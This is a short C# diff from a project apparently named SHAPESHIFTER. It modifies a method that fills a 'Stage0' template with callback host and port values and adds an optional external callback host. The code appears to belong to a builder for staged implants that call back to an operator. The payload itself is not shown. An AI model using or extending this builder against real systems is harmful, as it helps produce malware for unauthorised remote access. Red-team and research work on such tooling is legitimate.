@@ -9,7 +9,7 @@ namespace SHAPESHIFTER
 {
     class Compiler
     {
-        public static bool CompileStage0(string host, int port)
+        public static bool CompileStage0(string host, int port, string external = "")
         {
             string sourcePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
             string sourceFile = Path.Combine(sourcePath, @"Templates\Stage0Template.cs");
@@ -23,8 +23,15 @@ namespace SHAPESHIFTER
 
             // Replace placeholders with information for the callback
             string template = File.ReadAllText(sourceFile);
-            string modified = template.Replace(@"[SHAPESHIFTER_HOST]", host);
-            modified = modified.Replace(@"[SHAPESHIFTER_PORT]", port.ToString());
+            string modified = template.Replace(@"[SHAPESHIFTER_PORT]", port.ToString());
+            if (external != String.Empty)
+            {
+                modified = modified.Replace(@"[SHAPESHIFTER_HOST]", external);
+            }
+            else
+            {
+                modified = modified.Replace(@"[SHAPESHIFTER_HOST]", host);
+            }
 
             File.WriteAllText(sourcePath + @"\BuiltStages\Stage0.cs", modified);
 
